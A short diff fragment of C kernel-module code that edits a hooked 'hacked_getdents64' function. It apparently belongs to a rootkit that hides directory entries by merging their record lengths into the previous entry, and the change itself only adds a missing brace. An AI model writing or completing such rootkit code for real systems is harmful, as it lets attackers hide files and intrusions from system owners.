@@ -75,6 +75,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
                 continue;
             }
             prev->d_reclen += dir->d_reclen;
+        }
         else
             prev = dir;
 
